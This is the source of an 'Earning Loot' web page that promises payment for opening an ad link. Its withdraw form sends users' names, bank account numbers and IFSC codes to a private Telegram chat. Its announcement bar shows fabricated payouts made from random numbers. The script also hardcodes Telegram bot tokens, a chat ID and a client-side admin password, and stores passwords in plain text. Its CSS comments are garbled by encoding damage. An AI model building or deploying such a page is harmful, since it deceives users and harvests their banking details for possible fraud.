<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Earning Loot</title>
    <style>
        /* ‡§Ü‡§™‡§ï‡§æ ‡§Æ‡•Ç‡§≤ CSS ‡§Ø‡§π‡§æ‡§Å ‡§∞‡§π‡•á‡§ó‡§æ, ‡§Æ‡•à‡§Ç‡§®‡•á ‡§á‡§∏‡•á ‡§∏‡§Ç‡§ï‡•ç‡§∑‡§ø‡§™‡•ç‡§§‡§§‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§π‡§ü‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§π‡•à */
        /* ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•á ‡§Æ‡•Ç‡§≤ CSS ‡§ï‡•ã ‡§Ø‡§π‡§æ‡§Å ‡§µ‡§æ‡§™‡§∏ ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç */
    </style>
</head>
<body>
    <!-- Welcome Screen -->
    <div id="welcomeScreen" class="welcome-screen">
        <h1 id="welcomeText"></h1>
    </div>

    <!-- Login Panel -->
    <div id="loginPanel" class="panel" style="display: none;">
        <h2>Login</h2>
        <input type="text" id="loginMobile" placeholder="Enter Mobile Number" required>
        <input type="password" id="loginPassword" placeholder="Enter Password" required>
        <button id="loginButton">Login</button>
        <p>Don't have an account? <button id="registerButton">Create Account</button></p>
    </div>

    <!-- Register Panel -->
    <div id="registerPanel" class="panel" style="display: none;">
        <h2>Create Account</h2>
        <p>Enter details and admin password to create an account.</p>
        <input type="text" id="registerMobile" placeholder="Enter Mobile Number" required>
        <input type="password" id="registerPassword" placeholder="Enter Password" required>
        <input type="password" id="adminPassword" placeholder="Enter Admin Password" required>
        <button id="submitRegisterButton" class="telegram-button">Create Account</button>
        <p>Already have an account? <button id="backToLoginButton">Login</button></p>
    </div>

    <!-- Dashboard -->
    <div id="dashboard" class="panel" style="display: none;">
        <h1 class="animated-text">Earning Loot</h1>
        <p class="tagline">Watch video and earn 5ü§ë</p>
        <div class="balance-box">
            <p>Balance: <span id="balance">0</span> ‚Çπ</p>
        </div>
        <button id="earnButton">Earn</button>
        <p id="timer"></p>
        <button id="withdrawButton" class="withdraw-button">Withdraw</button>
        <button id="joinTelegramButton" class="telegram-button">Join Telegram</button>
        <button id="logoutButton" class="logout-button">Logout</button>
    </div>

    <!-- Withdraw Form Popup -->
    <div id="withdrawFormPopup" class="popup" style="display: none;">
        <div class="popup-content">
            <span class="close-btn" id="closeWithdrawFormButton">√ó</span>
            <h2>Withdraw Funds</h2>
            <form id="withdrawForm" onsubmit="submitWithdrawForm(event)">
                <input type="number" id="amount" placeholder="Enter Amount" required min="1">
                <input type="text" id="name" placeholder="Enter Your Name" required>
                <input type="text" id="accountNumber" placeholder="Enter Bank Account Number" required>
                <input type="text" id="ifscCode" placeholder="Enter IFSC Code" required>
                <button type="submit" class="submit-button">Submit</button>
            </form>
        </div>
    </div>

    <!-- Custom Alert Box -->
    <div id="customAlert" class="custom-alert">
        <p id="alertMessage"></p>
    </div>

    <div id="announcementBar"></div>

    <script>
        // Telegram Bot Tokens and Chat ID
        const serverBotToken = '8089873363:AAE9UmxF93CLZEVFuAEgqu08X3Goj8ARFZg'; // @server_save96865_bot
        const withdrawBotToken = '7799495376:AAG-qEQ_10oeHBLJ8nxMxXCf0dyf5y6Sdr8'; // @Request_090956_bot
        const chatId = '6889555911'; // Chat ID for both bots
        const adminPass = 'admin123'; // Change this to a secure admin password

        // Welcome Screen Animation
        const welcomeText = "Welcome To Earning Loot";
        const welcomeElement = document.getElementById('welcomeText');
        let index = 0;

        function typeWelcomeText() {
            if (index < welcomeText.length) {
                welcomeElement.innerHTML += welcomeText.charAt(index);
                index++;
                setTimeout(typeWelcomeText, 120);
            } else {
                setTimeout(() => {
                    document.getElementById('welcomeScreen').style.display = 'none';
                    document.getElementById('loginPanel').style.display = 'block';
                }, 1500);
            }
        }
        typeWelcomeText();

        // Event Listeners
        document.getElementById('loginButton').addEventListener('click', login);
        document.getElementById('registerButton').addEventListener('click', showRegister);
        document.getElementById('submitRegisterButton').addEventListener('click', register);
        document.getElementById('backToLoginButton').addEventListener('click', showLogin);
        document.getElementById('earnButton').addEventListener('click', openYouTube);
        document.getElementById('withdrawButton').addEventListener('click', openWithdrawForm);
        document.getElementById('joinTelegramButton').addEventListener('click', openTelegram);
        document.getElementById('logoutButton').addEventListener('click', logout);
        document.getElementById('closeWithdrawFormButton').addEventListener('click', closeWithdrawForm);

        // Login Function
        async function login() {
            const mobile = document.getElementById('loginMobile').value.trim();
            const password = document.getElementById('loginPassword').value.trim();

            const user = await getUserData(mobile, password);
            if (user) {
                document.getElementById('loginPanel').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                updateBalance(user.balance);
                startTimer(user.lastEarned);
            } else {
                showCustomAlert('Invalid ID or password.');
            }
        }

        // Show Register Panel
        function showRegister() {
            document.getElementById('loginPanel').style.display = 'none';
            document.getElementById('registerPanel').style.display = 'block';
        }

        // Show Login Panel
        function showLogin() {
            document.getElementById('registerPanel').style.display = 'none';
            document.getElementById('loginPanel').style.display = 'block';
        }

        // Register Function (No Approval Needed)
        async function register() {
            const mobile = document.getElementById('registerMobile').value.trim();
            const password = document.getElementById('registerPassword').value.trim();
            const adminPassword = document.getElementById('adminPassword').value.trim();

            if (adminPassword !== adminPass) {
                showCustomAlert('Invalid admin password!');
                return;
            }

            // Check if mobile number already exists
            const existingUser = await getUserData(mobile);
            if (existingUser) {
                showCustomAlert('Mobile number already registered!');
                return;
            }

            const userData = {
                mobile: mobile,
                password: password,
                balance: 0,
                lastEarned: null
            };

            // Save the new user directly to the bot
            await sendToTelegram(`SAVE_USER:${JSON.stringify(userData)}`, serverBotToken);
            showCustomAlert('Account created successfully! Please login.');
            showLogin();
        }

        // Open YouTube and Add Balance
        async function openYouTube() {
            const mobile = document.getElementById('loginMobile').value.trim();
            const user = await getUserData(mobile);

            if (user) {
                const lastEarned = user.lastEarned;
                const currentTime = new Date().getTime();

                if (!lastEarned || (currentTime - lastEarned) >= 24 * 60 * 60 * 1000) {
                    window.open('https://tpi.li/X53AQ', '_blank');
                    const newBalance = user.balance + 5;
                    await updateUserData(mobile, { balance: newBalance, lastEarned: currentTime });
                    updateBalance(newBalance);
                    startTimer(currentTime);
                    showCustomAlert('5 ‚Çπ added to your balance!');
                } else {
                    showCustomAlert('You can only earn once every 24 hours.');
                }
            }
        }

        // Update Balance Display
        function updateBalance(balance) {
            document.getElementById('balance').innerText = balance.toFixed(2);
        }

        // Open Withdraw Form
        function openWithdrawForm() {
            document.getElementById('withdrawFormPopup').style.display = 'flex';
        }

        // Close Withdraw Form
        function closeWithdrawForm() {
            document.getElementById('withdrawFormPopup').style.display = 'none';
            document.getElementById('withdrawForm').reset();
        }

        // Submit Withdraw Form
        async function submitWithdrawForm(event) {
            event.preventDefault();

            const mobile = document.getElementById('loginMobile').value.trim();
            const amount = parseFloat(document.getElementById('amount').value);
            const name = document.getElementById('name').value.trim();
            const accountNumber = document.getElementById('accountNumber').value.trim();
            const ifscCode = document.getElementById('ifscCode').value.trim();

            const user = await getUserData(mobile);
            if (amount <= 0 || amount > user.balance) {
                showCustomAlert('Insufficient balance or invalid amount!');
                return;
            }

            const newBalance = user.balance - amount;
            await updateUserData(mobile, { balance: newBalance });
            updateBalance(newBalance);

            const message = `
Withdrawal Request:
User ID: ${mobile}
Amount: ${amount} ‚Çπ
Name: ${name}
Bank Account Number: ${accountNumber}
IFSC Code: ${ifscCode}
Timestamp: ${new Date().toLocaleString()}
            `;

            sendToTelegram(message, withdrawBotToken);
            showCustomAlert('Withdrawal request submitted!');
            closeWithdrawForm();
        }

        // Get User Data from Telegram Bot
        async function getUserData(mobile, password = null) {
            const url = `https://api.telegram.org/bot${serverBotToken}/getUpdates`;
            const response = await fetch(url);
            const data = await response.json();

            if (data.ok && data.result.length > 0) {
                const messages = data.result;
                for (let msg of messages) {
                    if (msg.message && msg.message.text.includes(`USER_DATA:${mobile}`)) {
                        const userData = JSON.parse(msg.message.text.split('USER_DATA:')[1]);
                        if (!password || userData.password === password) {
                            return userData;
                        }
                    }
                }
            }
            return null;
        }

        // Update User Data in Telegram Bot
        async function updateUserData(mobile, updates) {
            const url = `https://api.telegram.org/bot${serverBotToken}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `UPDATE_USER_DATA:${mobile}:${JSON.stringify(updates)}`
                })
            });
        }

        // Send to Telegram Bot
        function sendToTelegram(message, botToken) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            }).then(response => response.json())
            .then(data => {
                if (!data.ok) showCustomAlert(`Failed to send: ${data.description}`);
            }).catch(error => {
                showCustomAlert('Network error. Check your connection.');
            });
        }

        // Open Telegram
        function openTelegram() {
            window.open('https://t.me/Earninglooter9099', '_blank');
        }

        // Logout
        function logout() {
            document.getElementById('dashboard').style.display = 'none';
            document.getElementById('loginPanel').style.display = 'block';
            clearInterval(timerInterval);
        }

        // Custom Alert Box
        function showCustomAlert(message) {
            const alertBox = document.getElementById('customAlert');
            const alertMessage = document.getElementById('alertMessage');
            alertMessage.innerText = message;
            alertBox.style.display = 'block';
            setTimeout(() => { alertBox.style.display = 'none'; }, 3000);
        }

        // Timer Function with Announcement
        let timerInterval;
        function startTimer(lastEarned) {
            const timerElement = document.getElementById('timer');
            clearInterval(timerInterval);

            timerInterval = setInterval(() => {
                const currentTime = new Date().getTime();
                const nextEarnTime = lastEarned ? lastEarned + 24 * 60 * 60 * 1000 : currentTime;
                const remainingTime = nextEarnTime - currentTime;

                if (remainingTime <= 0) {
                    timerElement.innerText = 'You can earn now!';
                    return;
                }

                const hours = Math.floor((remainingTime % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((remainingTime % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((remainingTime % (1000 * 60)) / 1000);

                timerElement.innerText = `Next earn in: ${hours}h ${minutes}m ${seconds}s`;
            }, 1000);

            // Announcement Bar
            const announcementBar = document.getElementById('announcementBar');
            function showRandomAnnouncement() {
                const randomNumber = Math.floor(1000000000 + Math.random() * 9000000000);
                const maskedNumber = `+91${'*'.repeat(7)}`;
                const randomAmount = Math.floor(500 + Math.random() * 1500);

                const announcements = [
                    `User ${randomNumber} just earned 5!`,
                    `Withdrawn: ${randomAmount}‚Çπ by ${maskedNumber}`,
                    `New withdrawal: ${randomAmount}‚Çπ by ${maskedNumber}`,
                    `User ${maskedNumber} earned 5!`,
                    `Withdrawn: ${randomAmount}‚Çπ by User ${randomNumber}`
                ];

                announcementBar.innerText = announcements[Math.floor(Math.random() * announcements.length)];
            }
            setInterval(showRandomAnnouncement, 3000);
            showRandomAnnouncement();
        }
    </script>
</body>
</html>
